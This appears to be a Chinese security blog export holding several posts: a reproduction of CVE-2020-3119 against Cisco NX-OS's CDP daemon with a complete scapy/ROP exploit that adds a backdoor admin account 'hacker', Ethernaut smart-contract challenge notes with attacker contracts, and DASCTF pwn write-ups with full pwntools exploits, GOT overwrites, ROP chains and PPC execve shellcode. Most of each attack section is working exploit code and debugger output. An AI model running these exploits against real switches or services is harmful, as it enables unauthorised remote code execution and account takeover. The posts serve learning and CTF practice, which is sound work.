由于没有对Power Request的个数进行检查，所以我们可以轻松地构造Power Request个数超过16的CDP报文，在填充16个int的padding之后就可以覆盖到ebp、返回地址以及之后的值。 环境搭建环境搭建可能是整个漏洞复现过程中最麻烦的一个步骤，其中的坑比漏洞利用本身还要多，笔者试着将自己遇到的一些坑记录一下。 使用GNS3模拟器可以对Cisco NX-OSv 9000交换机进行全系统模拟，其实质是使用qemu进行虚拟化。笔者实验使用的GNS3版本为2.2.17，截至本文写作之时GNS3版本已升级至2.2.17，不过GNS3的版本不同应该不会有什么问题。GNS3安装本身遇到问题的话可以参见这篇教程。 接下的一件事是下载固件，由于我一开始对Cisco的产品线没有什么了解，固件的格式也分不清楚，导致下载了两次都发现下载错了，和GNS3所要求使用的固件不匹配。GNS3是支持Cisco NX-OS 9000的模拟的，但是这个被模拟系统有一个另外的名字：Cisco NX-OSv 9000，NX OSv 9000是一个虚拟平台，旨在模拟运行Cisco Nexus 9000操作系统的网络设备。尽管没有实现特定的硬件仿真，但是NX OSv 9000和Cisco Nexus 9000上运行的软件是一模一样的。具体的介绍可以查阅官网。 所以说，不是Cisco官网上提供的所有固件下载下来都是可以用GNS3跑的，必须要下载它指定的系统镜像，如下图所示，我们要下载nxosv-final.9.2.3.qcow2这个文件，OVMF-20160813.fd是GNS3自带的一个文件： 下载得到固件之后将固件导入到GNS3中创建模板，创建的时候默认的一些模板参数不要改动，特别是内存默认是8G的不要改小了，小于8G的话系统就跑不起来了。 在网络拓扑方面我直接将本机的WLAN端口和交换机的e1/1端口相连，在物理机编写好exp后可以直接发送给交换机。 在官网的教程里有这么一段话： 需要照做，不然确实再次启动就起不来了。 系统的的启动是很慢的，需要等不少时间。等看到login prompt后输入admin和密码就可以登录了。（中间一大段是系统log） 进入Cisco的shell之后run bash即可拿到一个bash，再su输入admin的密码即可拿到rootshell。 环境到此就算搭建完成了，有了root shell也可以用gdb调试任意的进程了，接下来介绍漏洞利用的思路。 漏洞利用scapy构造CDP报文使用scapy可以构造CDP包，从Hcamael师傅的分析文章中截取一段模板如下： 123456789101112131415from scapy.contrib import cdpfrom scapy.all import Ether, LLC, SNAPl2_packet = Ether(dst="01:00:0c:cc:cc:cc")# Logical-Link Controll2_packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP()# Cisco Discovery Protocolcdp_v2 = cdp.CDPv2_HDR(vers=2, ttl=180)deviceid = cdp.CDPMsgDeviceID(val='nxos922(97RROM91ST3)')portid = cdp.CDPMsgPortID(iface=b"ens38")address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr="192.168.1.3"))cap = cdp.CDPMsgCapabilities(cap=1)cdp_packet = cdp_v2/deviceid/portid/address/cappacket = l2_packet / cdp_packetsendp(packet) 漏洞利用的思路比较明确，由于不存在栈canary但是有ASLR和NX，溢出后可以ROP至libc段或其他可执行段去执行system函数。 在实际测试中，libc的基址只有一个字节会发生变化。这是由于32位ASLR的是整体在一个随机的基址上进行一个整体的偏移的。所以即便面对ASLR我们也可以通过爆破一个字节来获取一个确定的libc基址，具体的原理参见Stack Overflow上的一个回答。 123450xf5def000 0xf5fa0000 0x1b1000 0x0 /lib/libc-2.22.so0xf5dda000 0xf5f8b000 0x1b1000 0x0 /lib/libc-2.22.so0xf5dfe000 0xf5faf000 0x1b1000 0x0 /lib/libc-2.22.so0xf5d84000 0xf5f35000 0x1b1000 0x0 /lib/libc-2.22.so0xf5e12000 0xf5fc3000 0x1b1000 0x0 /lib/libc-2.22.so 返回之前的约束利用的过程中有两个地方需要注意： 第一个是我们在覆盖了eip之后紧接着就会覆盖到第一个参数a1的值，但是a1在程序返回之前还会被解引用，并且a1的周围还会被写入数据，所以a1必须覆盖成一个可写的指针。 还有第二个地方需要注意的是在溢出操作之后必须要尽可能快的让函数执行到返回的地方，但是在溢出点之后执行流可能会进入到cdpd_send_pwr_req_to_poed函数中，该函数会调用__memcpy_to_buf限制了Power Requested的长度在40字节以内，导致溢出失败。为了不进入这个函数，我们必须要使得下面这个if条件判断为真，进入该分支不会执行到cdpd_send_pwr_req_to_poed函数中，并且能够顺利地执行到函数返回。 1234v6 = *((_WORD *)a1 + 604);v7 = *((_WORD *)a1 + 602);v8 = a1[303];if ( req_id == v6 &amp;&amp; mgmt_id == v7 ) 由于此时a1已经被覆盖，a1的值已经是我们所控制的值，所以结合上面的这两个约束条件，我们可以在内存中找一片可写的内存，并且该内存周围全是空值，然后设置req_id和mgmt_id也为控制，便可以满足这两个约束条件。 ROP链的构造由于libc的基址我们已经假设爆破得到了，在该libc中寻找可以进行system的ROP链就是利用的最后一步。 这里值得提的一点是该漏洞是没有交互的，一个CDP报文发送过去之后就没有然后了，没有输入，也没有输出，所有的payload都是在一个cdp包内发送的，payload的目的也不是去执行system(&quot;/bin/sh&quot;)，而是要选择其他的命令，这里介绍两种： 第一种，可以执行反连shell的代码。 第二种，可以添加一个管理员账号，比如执行如下命令：/isan/bin/vsh -c &quot;configure terminal ; username hacker password qweASD123 role network-admin&quot; 我们选择第二种方法，那么最后一个问题是，这个system的参数，如何传递？ 很巧的是，在溢出之后的栈上残留了一个指针，下面的例子中是0x100a883a这个指针，这个指针指向了cdp报文中的DeviceID开始的地方，于是我们可以利用这个指针在DeviceID中写入我们要执行的命令来进行system参数的传递。 但是美中不足的是DeviceID字段开头必须是固定的一个整数表示type，也就是说如果直接使用这个指针作为参数那么system的参数一定是以0x0001开头的，这是不能利用的，所以我们不得不对这个指针向后移动，至少移动4字节，指向我们所控制的数据区内。 1234567891011121314(gdb) x/240xb 0x100a890a - 2340x100a8820 &lt;packet&gt;: 0x01 0x00 0x0c 0xcc 0xcc 0xcc 0xc8 0x210x100a8828 &lt;packet+8&gt;: 0x58 0x68 0xcf 0x22 0x00 0xe2 0xaa 0xaa0x100a8830 &lt;packet+16&gt;: 0x03 0x00 0x00 0x0c 0x20 0x00 0x02 0xb40x100a8838 &lt;packet+24&gt;: 0x19 0x15 0x00 0x01 0x00 0x60 0x2f 0x690x100a8840 &lt;packet+32&gt;: 0x73 0x61 0x6e 0x2f 0x62 0x69 0x6e 0x2f0x100a8848 &lt;packet+40&gt;: 0x76 0x73 0x68 0x20 0x2d 0x63 0x20 0x220x100a8850 &lt;packet+48&gt;: 0x63 0x6f 0x6e 0x66 0x69 0x67 0x75 0x720x100a8858 &lt;packet+56&gt;: 0x65 0x20 0x74 0x65 0x72 0x6d 0x69 0x6e(gdb) x/40xw $esp0xffffc9cc: 0x64646464 0xf680965c(1st) 0x65656565 0x656565650xffffc9dc: 0x65656565 0x0000001a 0xffffca38 0x1008ac100xffffc9ec: 0x1009f798 0xffffca3c(mov_pop_edi_ret) 0xffffca58(edi) 0xffffceb8 (add_eax_0xc_ret)0xffffc9fc: 0x1002e8b8(push_eax_call_edi) 0x100a883a 0x00b40000 0x100a891a 上面这是函数返回时内存的一个情况，0xffffc9cc指向被劫持的eip。 所以我们就在libc寻找可以利用的gadget，找到如下gadget： 123456ret = base + 0x000003f3 # 0x000003f3 : retpop_edi_ret = base + 0x0001764b # 0x0001764b : pop edi ; retpop_eax_ret = base + 0x00021b07 # 0x00021b07 : pop eax ; retmov_pop_edi_ret = base + 0x001434c2 # 0x001434c2 : mov eax, dword ptr [esp + 0xc] ; pop edi ; retadd_eax_0xc_ret = base + 0x0010385a # 0x0010385a : add eax, 0xc ; retpush_eax_call_edi = base + 0x0001cb19 # 0x0001cb19 : push eax ; call edi 最后构造ROP链。 模拟器调试首先关闭系统的ASLR 1234567891011121314switch# run bashbash-4.3$ suPassword:bash-4.3# iduid=0(root) gid=0(root) groups=0(root)bash-4.3# ps aux | grep cdpdroot 1650 0.0 0.0 5944 1776 ttyS0 S+ 01:28 0:00 grep cdpdroot 27967 0.1 0.8 832896 72008 ? Ss 01:20 0:00 /isan/bin/cdpdbash-4.3# cat /proc/sys/kernel/randomize_va_space2bash-4.3# echo 0 | tee /proc/sys/kernel/randomize_va_space0bash-4.3# cat /proc/sys/kernel/randomize_va_space0 然后先用exp打一次，这个时候的cdpd是开了ASLR的，所以会崩溃，崩溃之后重启的cdpd就是没有开ASLR的了。 1bash-4.3# 2021 Mar 15 01:30:34 switch %$ VDC-1 %$ %SYSMGR-2-SERVICE_CRASHED: Service &quot;cdp&quot; (PID 27967) hasn&apos;t caught signal 11 (core will be saved). 使用gdb attach挂载到cdpd进程上，在cdpd_poe_handle_pwr_tlvs函数ret的地方下断点，然后继续调试，同时用exp再打一遍。 1234567891011121314151617181920212223242526bash-4.3# ps aux | grep cdpdroot 1890 1.6 0.8 835100 70452 ? Ss 01:30 0:00 /isan/bin/cdpdroot 2519 0.0 0.0 5944 1760 ttyS0 S+ 01:31 0:00 grep cdpdbash-4.3# gdb /isan/bin/cdpd -p 1890GNU gdb (GDB) 7.10.1Copyright (C) 2015 Free Software Foundation, Inc.Reading symbols from /isan/bin/cdpd...(no debugging symbols found)...done.Attaching to program: /isan/bin/cdpd, process 1890Reading symbols from /usr/lib/libssl.so.1.0.0...(no debugging symbols found)...done. ......Reading symbols from /isan/lib/libigmp_dll.so...(no debugging symbols found)...done.0xf7fd8c30 in __kernel_vsyscall ()(gdb) info proc mappingsprocess 1890Mapped address spaces: Start Addr End Addr Size Offset objfile 0x10000000 0x1009f000 0x9f000 0x0 /isan/bin/cdpd 0x1009f000 0x100a1000 0x2000 0x9f000 /isan/bin/cdpd 0x100a1000 0x103b4000 0x313000 0x0 [heap](gdb) b *(0x369EF+0x10000000)Breakpoint 1 at 0x100369ef(gdb) cContinuing. 这次gdb就会在cdpd_poe_handle_pwr_tlvs函数返回的时候停下来，观察溢出后的栈的情况： 123456789101112131415161718192021222324252627282930313233343536Breakpoint 1, 0x100369ef in cdpd_poe_handle_pwr_tlvs ()(gdb)(gdb) x/40xw $esp0xffffc9cc: 0xf666b64b 0xf680965c 0xf66543f3 0xf66543f30xffffc9dc: 0xf66543f3 0xf66543f3 0xf66543f3 0xf66543f30xffffc9ec: 0xf66543f3 0xf67974c2 0xf6690790 0xf675785a0xffffc9fc: 0xf6670b19 0x100a883a 0x00b40000 0x100a89440xffffca0c: 0x100a88c4 0x103447cc 0x10345ecc 0x011402010xffffca1c: 0x00000000 0x00000006 0x10110b0c 0x100a894a0xffffca2c: 0xffff0006 0xf7fe79fb 0xf692926c 0x313131310xffffca3c: 0x6f662020 0x20646e75 0x20727750 0x736e6f430xffffca4c: 0x564c5420 0x3020000a 0x202c3378 0x695f66690xffffca5c: 0x7865646e 0x78305b3a 0x30306131 0x30303030(gdb) x/2i 0xf666b64b 0xf666b64b &lt;__libgcc_s_init+139&gt;: pop %edi 0xf666b64c &lt;__libgcc_s_init+140&gt;: ret(gdb) x/i 0xf66543f3 0xf66543f3: ret(gdb) x/3i 0xf67974c2 0xf67974c2 &lt;__strnlen_sse2+962&gt;: mov 0xc(%esp),%eax 0xf67974c6 &lt;__strnlen_sse2+966&gt;: pop %edi 0xf67974c7 &lt;__strnlen_sse2+967&gt;: ret(gdb) x/2i 0xf675785a 0xf675785a &lt;inet6_option_space+10&gt;: add $0xc,%eax 0xf675785d &lt;inet6_option_space+13&gt;: ret(gdb) x/2i 0xf6670b19 0xf6670b19 &lt;__gconv_transform_ascii_internal+201&gt;: push %eax 0xf6670b1a &lt;__gconv_transform_ascii_internal+202&gt;: call *%edi(gdb) x/i 0xf6690790 0xf6690790 &lt;__libc_system&gt;: sub $0xc,%esp(gdb) x/3s 0x100a883a0x100a883a &lt;packet+26&gt;: &quot;&quot;0x100a883b &lt;packet+27&gt;: &quot;\001&quot;0x100a883d &lt;packet+29&gt;: &quot;jxxxxxxxx/isan/bin/vsh -c \&quot;configure terminal ; username hacker password qweASD123 role network-admin\&quot;&quot; 0xf680965c这个指针位于a1的位置，也就是第一个参数，是我随机选择的指向libc数据段的一个指针，它的周围都是0，满足上述的那些条件，随后用0xf66543f3处单条的ret语句调整esp的位置靠近我们想要的指针0x100a883a，然后通过 12345mov 0xc(%esp),%eaxpop %ediadd $0xc,%eaxpush %eaxcall *%edi 这5条指令实现system(&quot;/isan/bin/vsh -c \&quot;configure terminal ; username hacker password qweASD123 role network-admin\&quot;&quot;)的效果。 完整exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from scapy.contrib import cdpfrom scapy.all import Dot3, LLC, SNAP, sendpimport timeethernet = Dot3(dst="01:00:0c:cc:cc:cc")llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP()cdp_header = cdp.CDPv2_HDR(vers=2, ttl=180)# deviceid = cdp.CDPMsgDeviceID(val='nxos922(97RROM91ST3)')cmd = 'x' * (0xc - 4)cmd += '/isan/bin/vsh -c "configure terminal ; username hacker password qweASD123 role network-admin"'cmd += '\x00'deviceid = cdp.CDPMsgDeviceID(val=cmd)portid = cdp.CDPMsgPortID(iface="br0")address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr="192.168.110.130"))cap = cdp.CDPMsgCapabilities(cap=1)base = 0xf6654000system = base + 0x3C790ret = base + 0x000003f3 # 0x000003f3 : retpop_edi_ret = base + 0x0001764b # 0x0001764b : pop edi ; retpop_eax_ret = base + 0x00021b07 # 0x00021b07 : pop eax ; retmov_pop_edi_ret = base + 0x001434c2 # 0x001434c2 : mov eax, dword ptr [esp + 0xc] ; pop edi ; retadd_eax_0xc_ret = base + 0x0010385a # 0x0010385a : add eax, 0xc ; retpush_eax_call_edi = base + 0x0001cb19 # 0x0001cb19 : push eax ; call edipadding = b"\x00" * 4 # Requist-ID: 0x0000, Management-ID: 0x0000padding += b"bbbb" * 16 # Power Request Entry x 16padding += b"cccc" # placeholder for saved ebppayload = padding payload += pop_edi_ret.to_bytes(4, 'big') # pop out next unused parameter a1payload += (0xf6809b10 - 1204).to_bytes(4, 'big') # 1st parameter : a1payload += ret.to_bytes(4, 'big') * 7 # adjust the stackpayload += mov_pop_edi_ret.to_bytes(4, 'big') # mov eax, dword ptr [esp + 0xc] ; pop edi ; retpayload += system.to_bytes(4, 'big') # addr(system) into edipayload += add_eax_0xc_ret.to_bytes(4, 'big') # add eax, 0xc ; retpayload += push_eax_call_edi.to_bytes(4, 'big') # shootpower_req = cdp.CDPMsgUnknown19(val=payload)power_level = cdp.CDPMsgPower(power=16)cdp_packet = cdp_header/deviceid/portid/address/cap/power_req/power_level# print('[+] try 256 times to see if we success ...')# for i in range(0x100):# print('\r[*] sending packet &#123;&#125; / 256'.format(i + 1),end='')# sendp(ethernet/llc/cdp_packet)# time.sleep(0.5)print('This payload exploit CVE-2020-3119 to gain RCE and add an administrator account')print('username/pw: hacker/qweASD123')print('we cannot determine whether our payload success or not in one shot')print('because there is no interactive')print('in reality, aslr is enabled, so we must try 256 times')print('here demonstrate the situation without ASLR: we only need to send one packet')sendp(ethernet/llc/cdp_packet)print('[+] done !') 效果演示 总结与感想 GNS3模拟器会不时地突然重启，比较迷惑，暂时认为是模拟器不稳定的问题。]]></content>
      <tags>
        <tag>Cisco Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut 通关笔记]]></title>
    <url>%2F2021%2F02%2F21%2FEthernaut%2F</url>
    <content type="text"><![CDATA[Ethernaut复活了，赶紧开始做题 Level 0. Hello Ethernaut使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过 Level 1. Fallback需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。 Level 2. Fallout一款对程序猿友好的字体是多么重要。 一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。 复制到编辑器里就稍微明显一点了，不然我是真看不出区别。 Level 3. Coin Flip123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pragma solidity ^0.6.0;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(blockhash(block.number - (1))); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract Hacker &#123; address target = 0xDD0b2E36064953cD7b75c0a35aF25D82fF948575; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; CoinFlip cf = CoinFlip(target); function exploit() public &#123; uint256 blockValue = uint256(blockhash(block.number - (1))); uint256 coinFlip = blockValue / (FACTOR); bool side = coinFlip == 1 ? true : false; cf.flip(side); &#125;&#125; 还需要顺便复习一下web3py的用法 最新的文档已经用get_storage_at这个函数了 Level 4. Telephonetx.origin是交易的发送方，不是方法调用的调用方。 1234567891011121314151617181920212223242526pragma solidity ^0.6.0;contract Telephone &#123; address public owner; constructor() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract Hacker &#123; constructor () public &#123; address payable account = 0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F; address target = 0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A; Telephone t = Telephone(target); t.changeOwner(account); selfdestruct(account); &#125;&#125; 12In [8]: w3.eth.getStorageAt(w3.toChecksumAddress('0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A'),0)Out[8]: HexBytes('0x0000000000000000000000009b3754c0a0798ade51e98c7a81ae73aacf9c2e5f') Level 5. Token一开始也是没有注意到有整数溢出，require(balances[msg.sender] - _value &gt;= 0); 和require(balances[msg.sender] &gt;= _vale);这两个是不一样的。 第一个是先做了减法运算的，然后和0进行比较，而第二个是两个数直接进行比较。 注意转账的接收方不能是自己，不然溢出之后又溢出回来了。 Level 6. Delegation There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values. This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address. This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to implement a complex data structure. .delegatecall(bytes memory) returns (bool, bytes memory) issue low-level DELEGATECALL with the given payload, returns success condition and return data, forwards all available gas, adjustable]]></content>
      <tags>
        <tag>blockchain ethernet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DASCTF一月赛2021 Writeup]]></title>
    <url>%2F2021%2F02%2F01%2FDASCTF-01-2021%2F</url>
    <content type="text"><![CDATA[HWS计划2021硬件安全冬令营线上选拔赛，有很多IoT的题和kernel的题，很多题没来的及做，把做出来的几道题记录一下 趁着这次机会用上了传闻已久的IDA 7.5嘻嘻 Pwnememarmarm64，libc版本Ubuntu GLIBC 2.27-3ubuntu1，edit函数会在free之前把最低字节置成0，这样可以把一个可控的chunk提前free进tcache。因为是堆题，花了一天的时间研究怎么在gdb-mutliarch连上之后用heap、bins这些命令，无果，问了学弟他说他做这种别的架构的堆题从来不用插件的命令，就自己看。后来然后就没研究了，自己看也没有特别麻烦。 进了tcache后改fd指向got，劫持free的got表项至system，got表的数据如下。因为是qemu，我这次比赛自己测试后的结论是：同样的qemu运行在不同机器上偏移是不同的，但是在同一台机器上两次运行的偏移是一样的，也就是堆栈什么的都没有随机化。如果有知道为什么的师傅请告诉我。XD 1234560x412000: 0x00000040008ae308 0x00000040008ba1280x412010: 0x0000004000863600 0x00000000004006c00x412020: 0x00000000004006c0 0x00000000004006c00x412030: 0x00000040008a6f40 (puts) 0x00000040008ba790 (free) -&gt; 0x40008822c8 (system)0x412040: 0x00000040008a2668 (scanf) 0x00000040009059c8 (read)0x412050: 0x0000004000890970 0x0000000000000000 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.terminal=['tmux','new-window']context.binary='./ememarm'LOCAL=1if LOCAL: # p=process(['qemu-aarch64','-g','5555','-L','.','./ememarm']) p=process(['qemu-aarch64','-L','.','./ememarm'])else: p=remote('183.129.189.60',10034) def request(cx=b'\n',cy=b'\n',add=True,large=False): if large: p.sendlineafter('choice: \n','4') else: p.sendlineafter('choice: \n','1') p.sendafter('cx:\n',cx) p.sendafter('cy:\n',cy) if add: p.sendlineafter('delete?\n','1') else: p.sendlineafter('delete?\n','0')def edit(idx,content=b'\n'): p.sendlineafter('choice: \n','3') p.sendline(str(idx)) p.send(content)p.sendlineafter('\n','zploser')request(large=True)request(b'/bin/sh\x00')request()request()got=0x412030 # puts@pltedit(3,p64(got)+b'x'*0xf+b'\n')edit(3,p64(got)+b'\n')request(add=False)if LOCAL: request(p64(0x40008a6f40),p64(0x40008822c8),False) # puts, free edit(1) # trigger free (now system)else: offset=0x8a6f40-0x893f40 request(p64(0x40008a6f40-offset),p64(0x40008822c8-offset),False) edit(1)p.interactive() emarmarm64，验证密码的时候用了strncmp，密码填1绕过的概率是 1/256，这里需要爆破。进入之后给了一个低地址的任意地址写，正好可以写got表，劫持atoi的got表到system。执行atoi的时候输入长度只有4字节，没法给/bin/sh，但是给sh就可。 exp123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/pythonfrom pwn import *context.log_level=logging.INFOcontext.terminal=['tmux','new-window']context.binary='./emarm'def exp(): LOCAL=1 if LOCAL: # p=process(['qemu-aarch64','-g','5555','-L','.','./emarm']) p=process(['qemu-aarch64','-L','.','./emarm']) else: p=remote('183.129.189.60',10012) try: p.sendlineafter('passwd:\n','1') p.send(str(0x412020).encode()+b'\x00') # 4268064 (7) if LOCAL: p.send(p64(0x40008822c8)) # system else: p.send(p64(0x40008822c8-(0x8a6f40-0x893f40))) p.send(b'sh\x00\x00') p.sendline('id') p.recv(1) print('[+] ok, here is shell') p.interactive() except KeyboardInterrupt: exit(0) except: passfor i in range(0x100): exp()print('[x] bad luck ...') justcode菜单给了两个选项，一个任何地址写，一个可以泄露栈cookie。 这里用read将用户输入读到栈上最后没加\x00，选择好偏移就可以leak出libc的地址，libc基址get。 这个函数还有一点是它read的长度，正好能够覆盖栈canary。因为栈canary最地位永远是\x00，所以可以把cananry也leak了。 这里ida非常牛逼的把v1表注了未初始化，这里在之前控制好栈上原有的内容之后可以任意地址写。 我的选择是首先写exit的got，让main函数可以不断重复（次数不够）。然后写__stack_chk_fail的got，之后leak stack canary。然后改fgets的got到gets，造成栈溢出。 之后就是x86架构溢出后的rop了。因为开了seccomp，所以就在libc段rop，执行open-read-write。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.terminal=['tmux','new-window']context.binary='./justcode'LOCAL=0if LOCAL: p=process('./justcode')else: p=remote('183.129.189.60',10041) main=0x400A10p.sendlineafter('your code:\n','\n'.join(['1','1','2','3']))padding=b'x'*7+b'\n'p.sendafter('name:\n',padding)p.recvuntil(padding)base=u64(p.recv(6).ljust(8,b'\x00'))-(0x7ffff784161e-0x7ffff77c6000)system=base+(0x7ffff780b3a0-0x7ffff77c6000)gets=base+(0x7ffff7834d90-0x7ffff77c6000)p.success(hex(base))padding=b'x'*(8+4)payload=padding+p32(0x602078) # exitp.sendlineafter('name:\n',payload)p.sendlineafter('id:\n',str(main)) # mainp.sendlineafter('info:\n','')p.recvuntil('no check')# Again, overwrite __stack_chk_fail : prepare for leak of stack canaryp.sendlineafter('your code:\n','\n'.join(['1','2','1','1']))padding=b'x'*(8+4)payload=padding+p32(0x602038) # __stack_chk_failp.sendlineafter('name:\n',payload)p.sendlineafter('id:\n',str(main)) # mainp.sendlineafter('info:\n','')padding=b'x'*0x88p.sendlineafter('name:\n',padding)p.recvline()cookie=b'\x00'+p.recv(7)p.success(b'cookie: '+cookie)# Again, overwrite fgets to gets: stack overflowp.sendlineafter('your code:\n','\n'.join(['1','2','3','1']))padding=b'x'*(8+4)payload=padding+p32(0x602058) # fgetsp.sendlineafter('name:\n',payload)p.sendlineafter('id:\n',str(gets)) # getsp.sendlineafter('info:\n','')# overflowp.sendlineafter('your code:\n','\n'.join(['4','4','4']))# attach(p,'b *0x400E30\nc')payload=b'x'*0x18+cookiepayload+=p64(0)syscall=base+0x00000000000bc3f5pop_rdi=lambda rdi: flat([base+0x0000000000021112,rdi])pop_rsi=lambda rsi: flat([base+0x00000000000202f8,rsi])pop_rdx=lambda rdx: flat([base+0x0000000000001b92,rdx])pop_rax=lambda rax: flat([base+0x000000000003a738,rax])mov_rdi_rsp=base+0x000000000013aa40 # mov rdi, rsp ; call rdx ; add rsp, 0x38 ; ret # add_rdi=base+0x0000000000124034 # add rdi, rdx ; mov qword ptr [r9], rdi ; retret=0x400CC9# open()payload+=pop_rax(2)+pop_rdx(ret)payload+=p64(mov_rdi_rsp)payload+=b'flag\x00'.ljust(0x38)payload+=p64(syscall)buf=0x602088# read(3,buf,count)payload+=pop_rdi(3)+pop_rsi(buf)+pop_rdx(0x100)+pop_rax(0)+p64(syscall)# write(0,buf,count)payload+=pop_rdi(1)+pop_rsi(buf)+pop_rdx(0x100)+pop_rax(1)+p64(syscall)p.sendline(payload)p.interactive() ppc静态链接的ppc binary，第一次接触ppc，在这里学了基础的ppc汇编。 下了ppc的交叉编译链编译了个helloword对照着看。 我一开始看checksec的输出说Has RWX segments，但是gdb调的时候没有发现可写可执行的段，以为这个是checksec弄错了。 整个程序就一个栈溢出，我就想是ppc的rop？但是这种架构想要rop比x86要难很多，gadget的条件很苛刻，要同时使用mtlr指令修改r0寄存器后再调blr才能把链条延续下去。 然后我就抱着试一试的心理尝试了一下直接跳到globalbuffer上去执行一下，然后我吃惊地发现是可以执行的…… 这样的话，这题就是写ppc shellcode的题了。学习了久仰大名的keystone的编译框架。shellcode挺简单的，直接调的是execve(&quot;/bin/sh&quot;,0,0) 1234567891011121314151617181920212223242526from keystone import *# separate assembly instructions by ; or \nCODE = b"""b shell_code_start.long 0x2f62696e # /bin.long 0x2f736800 # /sh 00shell_code_start:lwz 31, 0(1)mr 3, 31li 4, 0li 5, 0li 0, 0xbsc"""try: # Initialize engine in X86-32bit mode ks = Ks(KS_ARCH_PPC, KS_MODE_PPC32 + KS_MODE_BIG_ENDIAN) encoding, count = ks.asm(CODE) print(type(encoding)) print("%s = %s (number of statements: %u)" %(CODE, [hex(i) for i in encoding], count)) print(bytes(encoding))except KsError as e: print("ERROR: %s" %e) 然后，我执行了，发现我的shellcode有0字节。在strcpy的时候被截断了。 照理来说这里我应该想怎么优化我的shellcode的，我又抱着试一下的心态跳到栈上去看看栈能不能执行。然后我惊讶的发现，栈是可以执行的…… 打远程的时候需要通过报错得到远程qemu执行起来栈的地址。类似这样 12345678910111213141516171819Invalid instruction NIP f6fffac0 LR f6fffabc CTR 1000de00 XER 00000000 CPU#0 MSR 00006040 HID0 00000000 HF 00006000 idx 0 TB 00216151 928362571951018 GPR00 00000000f6fffabc 00000000f6fffbf0 00000000100bb4d0 0000000000000000 GPR04 00000000100a01a7 0000000000000001 00000000100a01a7 0000000000000001GPR08 00000000ffffffff 0000000000000000 0000000000000001 00000000f6fffbf0GPR12 0000000000000000 00000000100a8de8 0000000000000000 0000000000000000GPR16 0000000000000000 0000000000000000 0000000000000020 00000000100a0000GPR20 00000000100a0ee0 00000000100a0ed8 00000000100a0000 0000000000500000GPR24 0000000000000000 0000000010000138 00000000100a0ee0 0000000000000000GPR28 0000000000000000 0000000010000f80 0000000010000e80 0000000078787878CR 28000242 [ E L - - - E G E ] RES ffffffffFPR00 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPR04 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPR08 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPR12 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPR16 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPR20 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPR24 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPR28 0000000000000000 0000000000000000 0000000000000000 0000000000000000FPSCR 00000000target=0xf6fffbf0-0x138 exp12345678910111213141516171819202122232425#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.terminal=['tmux','new-window']context.binary='./PPPPPPC'LOCAL=0if LOCAL: # p=process(['./qemu-ppc-static','-g','5555','-L','.','./PPPPPPC']) p=process(['./qemu-ppc-static','-L','.','./PPPPPPC'])else: p=remote('183.129.189.60',10039) shellcode=b'H\x00\x00\x0c/bin/sh\x00\x83\xe1\x00\x00\x7f\xe3\xfbx8\x80\x00\x008\xa0\x00\x008\x00\x00\x0bD\x00\x00\x02'if LOCAL: target=0xf6fff088else: target=0xf6fffbf0-0x138padding=shellcode.ljust(0x138,b'x')padding+=p32(target+4)payload=padding+p32(target)p.sendlineafter('name: ',payload)p.interactive() IoTeasymsgarm32的题，多线程起了一个server。主要的工作就是逆向，看它收到报文后的逻辑是怎么样的。 报文的格式挺简单的，有头、crc校验、长度、报文什么的。这里比较坑的一点是长度字段有两字节，长度要到0x100以上，不然有\x00会在strcpy的时候截断orz。 然后这题还是开了PIE的，我研究了半天PIE的话我怎么下断点？gdb刚连上的时候代码段都没加载。我问了学长，他说就一步步跟呗…… 最后我通过使用search -x 命令搜索snrpintf plt表的头几个字节来定位的代码段，顺便还发现使用sigint可以中断gdb server。 逆向完报文格式进来之后又是很好玩的几个选项。 有readfile来读文件，不过有些许限制；有ifconfig来查看ifconfig的输出；有setSystemParam，实际上是个用户认证函数；有leaveName，leaveName存在一个命令注入。 比较坑的一点是flag不在当前目录。 